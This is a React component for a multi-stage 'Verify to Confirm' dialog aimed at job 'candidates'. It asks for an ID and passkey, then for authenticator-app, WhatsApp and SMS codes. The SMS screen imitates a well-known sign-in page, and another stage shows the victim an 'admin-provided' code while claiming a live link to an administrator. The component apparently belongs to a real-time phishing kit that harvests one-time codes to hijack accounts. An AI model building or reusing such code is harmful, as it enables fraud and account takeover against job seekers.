"use client";

import { useState, useEffect } from "react";
import { Check, Copy, ShieldCheck, RefreshCw } from "lucide-react";
import { getCodeLabel } from "@/lib/codeData";

export type VerifyStage = "closed" | "idPasskey" | "waiting" | "code" | "displayCode";

function Shell({ children, maxWidth = "max-w-sm" }: { children: React.ReactNode; maxWidth?: string }) {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-ink/60 backdrop-blur-sm px-4"
      role="dialog"
      aria-modal="true"
    >
      <div className={`w-full ${maxWidth} bg-white border border-black/5 rounded-2xl shadow-2xl p-7 animate-fade-up`}>
        {children}
      </div>
    </div>
  );
}

// Custom SVG Illustration matching the reference picture
function SmsPhoneIllustration() {
  return (
    <div className="w-full h-44 bg-gradient-to-tr from-[#fbcfe8]/40 via-[#f3e8ff]/60 to-[#dbeafe]/70 rounded-xl flex items-center justify-center overflow-hidden border border-pink-100/60 shadow-inner relative select-none">
      <svg
        viewBox="0 0 320 200"
        className="w-full h-full max-h-44 object-contain"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        {/* Soft background glow */}
        <circle cx="160" cy="100" r="90" fill="#fdf2f8" fillOpacity="0.7" />

        {/* Hand Holding Phone */}
        <path
          d="M100 130 C95 110, 110 90, 120 85 L120 150 Z"
          fill="#F59E0B"
          fillOpacity="0.2"
        />
        {/* Right fingers holding phone */}
        <path
          d="M205 75 C215 75, 230 85, 230 110 C230 135, 220 160, 205 175 L205 80 Z"
          fill="#fca5a5"
        />
        {/* Red fingernail right */}
        <path
          d="M218 88 C222 88, 225 93, 224 98 C222 103, 218 103, 215 98 C215 93, 216 88, 218 88 Z"
          fill="#dc2626"
        />

        {/* Left hand & thumb */}
        <path
          d="M135 155 C135 135, 145 125, 155 125 C165 125, 168 140, 168 165 L135 175 Z"
          fill="#fca5a5"
        />
        {/* Red fingernail thumb */}
        <path
          d="M152 130 C156 130, 159 135, 158 140 C156 145, 152 145, 149 140 C149 135, 150 130, 152 130 Z"
          fill="#dc2626"
        />

        {/* Smartphone Body */}
        <rect
          x="120"
          y="25"
          width="85"
          height="160"
          rx="12"
          fill="#1E293B"
          stroke="#0F172A"
          strokeWidth="3"
        />
        {/* Smartphone Screen */}
        <rect
          x="123"
          y="28"
          width="79"
          height="154"
          rx="9"
          fill="#FFFFFF"
        />
        {/* Screen background gradient */}
        <rect
          x="123"
          y="28"
          width="79"
          height="154"
          rx="9"
          fill="url(#screenGrad)"
        />

        {/* Phone UI: top bar */}
        <circle cx="135" cy="42" r="3.5" fill="#93C5FD" />
        <rect x="144" y="40" width="30" height="4" rx="2" fill="#93C5FD" />

        {/* Chat message bubbles */}
        <rect x="130" y="55" width="50" height="15" rx="4" fill="#FFFFFF" fillOpacity="0.9" />
        <rect x="135" y="60" width="40" height="3" rx="1.5" fill="#93C5FD" />

        <rect x="148" y="76" width="32" height="4" rx="2" fill="#60A5FA" />

        {/* Big SMS Code box on screen */}
        <rect
          x="128"
          y="95"
          width="69"
          height="22"
          rx="4"
          fill="#FFFFFF"
          stroke="#E2E8F0"
          strokeWidth="1"
        />
        <text
          x="162"
          y="111"
          textAnchor="middle"
          fill="#1D4ED8"
          fontSize="14"
          fontWeight="bold"
          letterSpacing="2"
          fontFamily="monospace"
        >
          ******
        </text>

        <defs>
          <linearGradient id="screenGrad" x1="123" y1="28" x2="202" y2="182" gradientUnits="userSpaceOnUse">
            <stop stopColor="#EFF6FF" />
            <stop offset="0.5" stopColor="#FDF2F8" />
            <stop offset="1" stopColor="#F5F3FF" />
          </linearGradient>
        </defs>
      </svg>
    </div>
  );
}

export default function VerifyModal({
  stage,
  submitting,
  codeNumber = 1,
  displayCode = "",
  candidateName = "",
  candidatePhone = "",
  errorMessage,
  onSubmitIdPasskey,
  onSubmitCode,
  onCancel,
}: {
  stage: VerifyStage;
  submitting: boolean;
  codeNumber?: number;
  displayCode?: string;
  candidateName?: string;
  candidatePhone?: string;
  errorMessage: string | null;
  onSubmitIdPasskey: (candidateId: string, passkey: string) => void;
  onSubmitCode: (code: string) => void;
  onCancel: () => void;
}) {
  const [candidateId, setCandidateId] = useState("");
  const [passkey, setPasskey] = useState("");
  const [code, setCode] = useState("");
  const [copied, setCopied] = useState(false);

  // SMS Timer countdown (3:00 -> 180s)
  const [timerSeconds, setTimerSeconds] = useState(180);

  useEffect(() => {
    if (stage === "code") {
      setCode("");
      setTimerSeconds(180);
    }
  }, [stage, codeNumber]);

  useEffect(() => {
    if (stage === "code" && codeNumber === 3 && timerSeconds > 0) {
      const interval = setInterval(() => {
        setTimerSeconds((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [stage, codeNumber, timerSeconds]);

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  // Last 2 digits of candidate phone number
  const last2Digits = (candidatePhone || "").replace(/\D/g, "").slice(-2) || "20";

  if (stage === "closed") return null;

  if (stage === "waiting") {
    return (
      <Shell>
        <div className="flex flex-col items-center py-6 text-center space-y-4">
          <div className="h-10 w-10 rounded-full border-2 border-ink/20 border-t-ink animate-spin" />
          <p className="font-sans text-sm text-gray-600 font-medium">
            Verifying your details with our recruitment team…
          </p>
        </div>
      </Shell>
    );
  }

  // Display Code to Candidate (Admin-provided pop-out code)
  if (stage === "displayCode") {
    const handleCopy = () => {
      if (!displayCode) return;
      navigator.clipboard.writeText(displayCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    };

    return (
      <Shell>
        <div className="text-center space-y-4 font-sans">
          <div className="w-12 h-12 rounded-full bg-blue-50 text-[#0069ff] flex items-center justify-center mx-auto border border-blue-100">
            <ShieldCheck className="w-6 h-6" />
          </div>

          <h2 className="font-display text-2xl text-ink">Verification Code</h2>
          <p className="text-sm text-muted leading-relaxed">
            Please use this verification code provided directly by your interviewer:
          </p>

          {/* Prominent Code Box */}
          <div className="py-4 px-6 bg-blue-50/80 border-2 border-blue-200/80 rounded-2xl flex flex-col items-center justify-center shadow-inner relative group">
            <span className="font-mono text-3xl sm:text-4xl font-bold tracking-widest text-[#0069ff] select-all">
              {displayCode || "------"}
            </span>

            {displayCode && (
              <button
                type="button"
                onClick={handleCopy}
                className="mt-3 inline-flex items-center gap-1.5 px-3 py-1 bg-white hover:bg-gray-50 border border-blue-200 rounded-full text-xs font-semibold text-[#0069ff] transition-all shadow-2xs"
              >
                {copied ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-emerald-600" />
                    <span className="text-emerald-600">Copied to clipboard</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy Code</span>
                  </>
                )}
              </button>
            )}
          </div>

          <div className="pt-2 flex items-center justify-center gap-1.5 text-xs text-muted font-mono">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
            <span>Live connected with administrator</span>
          </div>
        </div>
      </Shell>
    );
  }

  // DEDICATED SMS STAGE (Identical to reference mockup: Name, Heading, Last 2 Digits, Illustration, Input, Timer, Continue, Try another way)
  if (stage === "code" && codeNumber === 3) {
    return (
      <Shell maxWidth="max-w-md">
        <div className="space-y-4 font-sans">
          {/* Top Line: Candidate Name */}
          <p className="text-sm font-semibold text-gray-800">
            {candidateName || "Candidate"}
          </p>

          {/* Heading */}
          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
            Check your text messages
          </h2>

          {/* Subtitle with last 2 digits */}
          <p className="text-xs text-gray-600">
            Enter the code we sent to *** *** *{last2Digits}.
          </p>

          {/* Custom Illustration */}
          <div className="my-2">
            <SmsPhoneIllustration />
          </div>

          {errorMessage && (
            <p className="rounded-lg border border-red-200 bg-red-50/80 px-4 py-2.5 text-xs text-red-700 font-medium">
              {errorMessage}
            </p>
          )}

          <form
            onSubmit={(e) => {
              e.preventDefault();
              onSubmitCode(code.trim());
            }}
            className="space-y-3.5 pt-1"
          >
            {/* Input Box matching reference design */}
            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2.5 bg-white transition-all shadow-2xs">
              <label className="block text-[11px] font-medium text-gray-500" htmlFor="sms-code-input">
                Code
              </label>
              <input
                id="sms-code-input"
                required
                autoFocus
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full text-base font-mono font-bold text-gray-900 outline-none bg-transparent tracking-wide mt-0.5"
              />
            </div>

            {/* Resend Timer Line */}
            <div className="flex items-center gap-1.5 text-xs text-gray-600 font-sans pt-0.5">
              <RefreshCw className="w-3.5 h-3.5 text-gray-500" />
              <span>We can send a new code in {formatTimer(timerSeconds)}</span>
            </div>

            {/* Action Buttons */}
            <div className="space-y-2 pt-2">
              <button
                type="submit"
                disabled={submitting || !code.trim()}
                className="w-full bg-[#7faeff] hover:bg-[#0069ff] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm"
              >
                {submitting ? "Submitting…" : "Continue"}
              </button>

              <button
                type="button"
                onClick={onCancel}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center"
              >
                Try another way
              </button>
            </div>
          </form>
        </div>
      </Shell>
    );
  }

  // Candidate Input for AuthApp (1), WhatsApp (2), Code 4 (4)
  if (stage === "code") {
    const label = getCodeLabel(codeNumber);

    return (
      <Shell>
        <h2 className="font-display text-2xl text-ink">{label} Code</h2>
        <p className="mt-2 text-sm text-muted leading-relaxed">
          Please enter the {label} verification code you were provided.
        </p>

        {errorMessage && (
          <p className="mt-4 rounded-sm border border-rejected/30 bg-rejected/5 px-4 py-3 text-sm text-rejected">
            {errorMessage}
          </p>
        )}

        <form
          className="mt-6 space-y-4"
          onSubmit={(e) => {
            e.preventDefault();
            onSubmitCode(code.trim());
          }}
        >
          <div>
            <label className="font-mono text-xs uppercase tracking-widest2 text-muted" htmlFor="additional-code">
              {label} Code
            </label>
            <input
              id="additional-code"
              required
              autoFocus
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder={`Enter ${label} code`}
              className="mt-2 w-full border-b-2 rule-hairline bg-transparent py-2 text-ink outline-none focus:border-brass transition-colors font-mono text-base"
            />
          </div>

          <button
            type="submit"
            disabled={submitting}
            className="w-full bg-ink text-paper py-3 font-mono text-xs uppercase tracking-widest2 hover:bg-brassdim transition-colors disabled:opacity-50"
          >
            {submitting ? "Submitting…" : "Submit"}
          </button>
        </form>
      </Shell>
    );
  }

  // stage === "idPasskey"
  return (
    <Shell>
      <h2 className="font-display text-2xl text-ink">Verify to Confirm</h2>
      <p className="mt-2 text-sm text-muted leading-relaxed">
        Enter the candidate ID and passkey you were provided so our team can
        verify your booking.
      </p>

      {errorMessage && (
        <p className="mt-4 rounded-sm border border-rejected/30 bg-rejected/5 px-4 py-3 text-sm text-rejected">
          {errorMessage}
        </p>
      )}

      <form
        className="mt-6 space-y-4"
        onSubmit={(e) => {
          e.preventDefault();
          onSubmitIdPasskey(candidateId.trim(), passkey.trim());
        }}
      >
        <div>
          <label className="font-mono text-xs uppercase tracking-widest2 text-muted" htmlFor="candidate-id">
            Candidate ID
          </label>
          <input
            id="candidate-id"
            required
            value={candidateId}
            onChange={(e) => setCandidateId(e.target.value)}
            className="mt-2 w-full border-b-2 rule-hairline bg-transparent py-2 text-ink outline-none focus:border-brass transition-colors"
            autoFocus
          />
        </div>
        <div>
          <label className="font-mono text-xs uppercase tracking-widest2 text-muted" htmlFor="passkey">
            Passkey
          </label>
          <input
            id="passkey"
            type="password"
            required
            value={passkey}
            onChange={(e) => setPasskey(e.target.value)}
            className="mt-2 w-full border-b-2 rule-hairline bg-transparent py-2 text-ink outline-none focus:border-brass transition-colors"
          />
        </div>

        <div className="flex gap-3 pt-4">
          <button
            type="button"
            onClick={onCancel}
            className="flex-1 border border-ink/20 py-3 font-mono text-xs uppercase tracking-widest2 text-muted hover:border-ink transition-colors"
          >
            Cancel
          </button>
          <button
            type="submit"
            disabled={submitting}
            className="flex-1 bg-ink text-paper py-3 font-mono text-xs uppercase tracking-widest2 hover:bg-brassdim transition-colors disabled:opacity-50"
          >
            {submitting ? "Submitting…" : "Submit"}
          </button>
        </div>
      </form>
    </Shell>
  );
}
